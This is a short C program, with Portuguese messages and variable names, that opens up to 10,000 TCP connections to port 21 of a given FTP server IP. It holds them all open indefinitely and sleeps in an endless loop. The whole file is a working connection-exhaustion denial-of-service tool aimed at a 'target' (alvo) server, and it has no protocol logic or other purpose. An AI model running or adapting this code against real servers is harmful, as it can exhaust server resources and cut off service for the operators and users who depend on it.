#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define MAX_CONNECTIONS 10000
#define FTP_SERVER_PORT 21

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Uso: %s <FTP_SERVER_IP>\n", argv[0]);
        return 1;
    }

    char *ftp_server_ip = argv[1];

    int meusocket[MAX_CONNECTIONS];
    int conecta;

    struct sockaddr_in alvo;

    
    for (int i = 0; i < MAX_CONNECTIONS; i++) {
        meusocket[i] = socket(AF_INET, SOCK_STREAM, 0);
        if (meusocket[i] < 0) {
            perror("Erro ao abrir o socket");
            return 1;
        }

        
        alvo.sin_family = AF_INET;
        alvo.sin_port = htons(FTP_SERVER_PORT);
        alvo.sin_addr.s_addr = inet_addr(ftp_server_ip);

        conecta = connect(meusocket[i], (struct sockaddr *)&alvo, sizeof(alvo));

        if (conecta == 0) {
            printf("Conexão #%d estabelecida com sucesso!\n", i);
        } else {
            printf("Erro ao conectar à porta %d\n", FTP_SERVER_PORT);
        }
    }

    
    while (1) {
        sleep(10); 
    }

    
    return 0;
}
